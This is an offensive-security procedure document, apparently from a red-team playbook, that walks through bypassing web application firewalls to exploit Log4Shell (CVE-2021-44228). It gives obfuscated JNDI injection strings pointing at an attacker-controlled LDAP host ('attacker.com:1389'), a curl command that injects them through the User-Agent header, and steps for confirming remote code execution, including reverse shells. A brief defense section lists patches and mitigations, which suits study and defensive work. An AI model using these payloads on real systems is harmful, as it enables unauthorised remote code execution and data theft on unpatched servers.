---
type: procedure
description: >-
  Bypass Web Application Firewall protections to exploit Log4Shell
  (CVE-2021-44228) using obfuscated JNDI injection payloads.
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - CVE-2021-44228
  - Log4Shell
  - WAF-Bypass
  - JNDI-Injection
  - RCE
commands:
  - '[[commands/curl-send-log4shell-payload]]'
tools: []
platforms:
  - Java
  - Web
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
validated: true
---

# Log4Shell-WAF-Bypass-using-JNDI-Injection

## Summary

This procedure demonstrates how to bypass Web Application Firewall (WAF) protections when exploiting the Log4Shell vulnerability (CVE-2021-44228) in Apache Log4j by using obfuscated JNDI injection payloads. These payloads evade common WAF signature-based detection through case manipulation, environment variable substitution, and other obfuscation techniques, allowing remote code execution (RCE) on vulnerable Java-based web applications.

## Description

Log4Shell (CVE-2021-44228) affects Log4j versions 2.0-beta9 through 2.14.1, enabling attackers to trigger JNDI lookups in log messages that resolve to malicious LDAP or RMI servers, leading to arbitrary code execution. WAFs often block direct payloads like "${jndi:ldap://attacker.com/a}", but obfuscation techniques—such as using PowerShell-like variable expansion, lowercase/uppercase mixing, and environment variables—can bypass these filters. This procedure assumes a vulnerable web application logs user input (e.g., in HTTP headers like User-Agent). The attacker sets up a malicious LDAP server to serve the exploit, then injects the obfuscated payload. Success results in the target fetching and executing code from the attacker's server. This is typically used in penetration testing against unpatched systems in web environments.

## Requirements

1. A vulnerable target running Log4j 2.0-beta9 to 2.14.1, accessible over the network (e.g., web app logging user input).
2. Attacker-controlled server to host an LDAP or RMI listener for payload delivery (e.g., using tools like marshalsec).
3. Network access to send HTTP requests to the target (no authentication required for public-facing apps).
4. Basic knowledge of HTTP request manipulation and JNDI exploitation.
5. curl or similar HTTP client installed on the attacker's machine.

## Defense

- Patch Log4j to version 2.17.0 or later to mitigate CVE-2021-44228.
- Configure WAF rules to detect and block obfuscated JNDI patterns, including case variations and variable substitutions.
- Disable JNDI lookups in Log4j by setting "log4j2.formatMsgNoLookups=true" or using JVM flags like "-Dlog4j2.formatMsgNoLookups=true".
- Monitor logs and network traffic for anomalous outbound connections to attacker-controlled domains or unusual LDAP/RMI traffic.
- Implement application-level logging sanitization to prevent user input from triggering JNDI.

## Objectives

1. Obfuscate JNDI payloads to evade WAF detection mechanisms.
2. Inject the payload into a vulnerable Log4j application via HTTP requests.
3. Trigger RCE on the target by resolving the JNDI lookup to an attacker-controlled server.
4. Verify exploitation through callback or code execution on the listener.

## Instructions

### Step 1: Set Up Malicious LDAP Server

**Context**: Prepare an LDAP server to serve the malicious payload when the target performs the JNDI lookup. This step ensures the target fetches and executes your code upon payload injection.

Use an external tool like marshalsec to start the LDAP server on your attacker machine, binding it to a domain or IP that the payload will reference.

> Expected: LDAP server listening on the specified port (e.g., 1389), ready to serve serialized Java class for RCE.

### Step 2: Generate Obfuscated JNDI Payload

**Context**: Use the provided code snippet to create WAF-bypassing JNDI strings. These leverage PowerShell-style obfuscation (though executed as log input) to hide keywords like "jndi" and "ldap" from signature detection.

**Code** ([[codes/PowerShell-JNDI-Injection-Payloads-for-Log4Shell]]):

Embed or copy the relevant payload string from the code, substituting your callback details (e.g., replace 127.0.0.1:1389 with your LDAP server IP/port or Burp Collaborator domain).

> Expected: A string like "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com:1389/a}" ready for injection.

### Step 3: Inject Payload into Target Application

**Context**: Send the obfuscated payload to the vulnerable application in a logged field, such as the User-Agent header, to trigger the Log4Shell JNDI lookup.

**Command** ([[commands/curl-send-log4shell-payload]]):
```bash
curl -H "User-Agent: $_PAYLOAD" "$_TARGET_URL"
```

> Replace $_PAYLOAD with the obfuscated string from Step 2 and $_TARGET_URL with the vulnerable endpoint (e.g., http://target.com/search?q=test). This injects the payload into the log, bypassing WAF if obfuscation succeeds. Monitor your LDAP server for incoming connections.

> Expected: HTTP response from the target (may be 200 OK or error), with no WAF block. Check LDAP listener for target IP connecting and executing the payload.

### Step 4: Verify Exploitation

**Context**: Confirm RCE by observing the callback on your LDAP server or executing a command that phones home (e.g., reverse shell).

Monitor the LDAP server logs for the target's connection and any executed commands. If using a domain like Burp Collaborator, check for DNS resolutions or HTTP interactions.

> Expected: Target initiates LDAP query to your server, downloads and runs the malicious class, resulting in command execution or data exfiltration.
